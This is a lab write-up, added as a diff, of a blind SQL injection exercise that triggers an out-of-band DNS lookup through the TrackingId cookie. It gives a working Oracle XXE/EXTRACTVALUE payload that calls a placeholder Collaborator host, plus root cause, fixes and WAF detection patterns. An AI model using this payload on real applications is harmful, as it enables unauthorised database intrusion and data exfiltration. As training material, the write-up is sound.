@@ -1,0 +1,52 @@
+Blind SQL injection — out‑of‑band interaction (Practitioner)
+
+Vulnerability: Blind SQL Injection → OOB (out‑of‑band) interaction via DNS
+Goal: Trigger a DNS lookup to Burp Collaborator by injecting into the TrackingId cookie.
+
+Summary
+
+This lab hides the vulnerable value inside a tracking cookie. The app builds a SQL query using that cookie, but the query runs asynchronously and doesn’t change the page output — so you won’t see a normal error or payload echo.
+That means blind SQLi: you have to force the app to interact with an external host (DNS) so you can observe the side‑channel. Burp Collaborator is the intended sink here — insert a Collaborator subdomain into a payload and the app will do the DNS lookup for you. Nothing weird in the UI at first glance — interesting once you intercept the cookie.
+
+Steps taken
+
+Logged in / opened the shop front page and just browsed a bit to generate normal requests.
+
+Spun up Burp Suite and enabled Intercept (or use a proxy history entry). Looked for the request that included the TrackingId cookie.
+
+The cookie looked innocent: TrackingId=xxxxxxxxxxxx. Nothing obvious in the response.
+
+Sent the request to Burp Repeater (or kept it in Intercept) so I could tamper with the cookie value.
+
+Because the SQL runs asynchronously and doesn't affect the response, I needed an OOB channel. Opened Burp Collaborator and used Insert Collaborator payload to generate a unique subdomain (the default public server).
+
+Lab note: the Academy firewall blocks arbitrary external systems, so use Burp Collaborator’s default public server — otherwise the lab won’t see your interaction.
+
+Modified the TrackingId cookie to include a payload that causes a DNS lookup. One way is to inject SQL that uses XML external entity resolution to fetch an external resource (XXE) via the DB, combined with UNION SELECT to force evaluation. Example payload (URL‑encoded snippet used in the lab):
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+Replace BURP-COLLABORATOR-SUBDOMAIN with the subdomain Burp created (use Burp’s Insert Collaborator payload to paste it in cleanly).
+
+Forwarded the modified request. The app processed the SQL asynchronously. No error, no content change (as expected).
+
+Checked Burp Collaborator — bingo: a DNS interaction from the lab server to your Collaborator subdomain. That proves the SQL injection executed and triggered OOB DNS. Lab solved.
+
+Root cause
+
+The application directly concatenates untrusted cookie data into a SQL query and executes it without proper input handling. The query is executed in a context that allows XML parsing / external entity resolution (or at least allows the DB to perform network lookups), so a crafted payload can cause the server to reach out to an attacker-controlled hostname. Because the app doesn’t return query results to the client, you need an OOB channel (DNS) to observe success.
+
+Fixes & mitigation
+
+Never concatenate raw client data (cookies, headers, params) into SQL queries. Use parameterized queries / prepared statements.
+
+Disable XML External Entity (XXE) resolution in any XML parser on the stack. If XML processing is required, configure parsers to disallow external entities.
+
+Least privilege for DB accounts — the DB user shouldn’t be able to make arbitrary network calls or access XML features if not needed.
+
+Validate and sanitize input server-side (the server must not trust cookies or client-controlled fields).
+
+Monitor outbound DNS/HTTP requests from app servers and alert on unusual lookups (helps catch blind/OOB exfil attempts).
+
+Consider a WAF rule to block suspicious payload patterns (e.g., EXTRACTVALUE, inline <!DOCTYPE, attempts to inject SYSTEM URIs) — but don’t rely on it as the only defense.
